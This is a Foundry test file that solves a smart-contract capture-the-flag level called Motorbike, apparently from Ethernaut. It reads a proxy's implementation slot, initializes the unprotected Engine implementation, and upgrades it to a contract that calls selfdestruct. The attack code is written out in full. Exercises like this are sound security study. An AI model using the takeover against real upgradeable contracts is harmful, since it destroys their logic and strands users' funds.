pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "src/levels/Motorbike/MotorbikeFactory.sol";
import "src/levels/Motorbike/Motorbike.sol";
import "forge-std/Test.sol";

contract MotorbikeAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    MotorbikeFactory public factory;
    Motorbike public instance;

    function setUp() public {
        factory = new MotorbikeFactory();
        instance = Motorbike(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        payable(dummyPlayerAddress).transfer(0.0011 ether);
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);

        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        // Read implementation address from Motorbike instance storage
        Engine engine = Engine(address(bytes20(uint160(uint256(vm.load(address(instance), _IMPLEMENTATION_SLOT))))));

        // Initialize enigne
        engine.initialize();

        // Deploy new attacker contract
        MotorbikeAttack attacker = new MotorbikeAttack();

        // Change implementation and call selfdestruct
        engine.upgradeToAndCall(address(attacker), abi.encodeWithSignature("kill()"));

        // This assertion do not passes because selfestruct in foundry does not  take effect until test is finished
        // https://github.com/foundry-rs/foundry/issues/1543
        // assertEq(
        //     factory.validateInstance(
        //         payable(address(instance)),
        //         dummyPlayerAddress
        //     ),
        //     true
        // );
    }
}

contract MotorbikeAttack {
    function kill() public payable {
        selfdestruct(payable(address(0)));
    }
}
